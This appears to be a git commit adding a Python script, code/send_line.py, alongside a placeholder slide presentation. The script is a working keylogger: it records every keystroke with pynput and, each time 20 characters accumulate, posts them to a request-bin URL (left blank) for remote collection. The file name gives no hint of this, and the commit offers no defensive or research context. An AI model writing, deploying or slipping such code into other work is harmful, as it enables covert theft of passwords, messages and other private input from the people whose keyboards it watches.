953234a01a21ea9b5ef5630a85bdf98e202b19f2
Saurabh <extremophilarum@gmail.com>
2022-09-24 00:18:11 +0530

    Push all

---
+++ code/send_line.py
@@ -0,0 +1,35 @@
+from pynput.keyboard import Key, Listener
+import requests
+
+keys = ''
+request_bin_url = ''
+
+def send_keys():
+    global keys
+    global last_send
+    print(keys)
+    requests.post(request_bin_url, data=keys)
+    keys = ''
+
+
+def on_press(key):
+    global keys
+    str_key = str(key)
+    if str_key == "Key.tab":
+        str_key = '\t'
+    elif str_key == "Key.enter":
+        str_key = '\n'
+    elif str_key == "Key.space":
+        str_key = ' '
+    elif str_key == "Key.backspace":
+        str_key = ' bspace '
+    elif "Key" in str_key:
+        str_key = str_key.replace("Key.", "")
+        str_key = f" {str_key} "
+    keys += str_key.strip('\'')
+    if len(keys) >= 20:
+        send_keys()
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
---
+++ presentation.md
@@ -0,0 +1,15 @@
+class: center, middle
+
+# Here's my new example presentation
+
+---
+
+# Here's the Agenda
+
+1. Introduction
+2. Deep-dive
+3. ...
+
+---
+
+# Here's a new Introduction
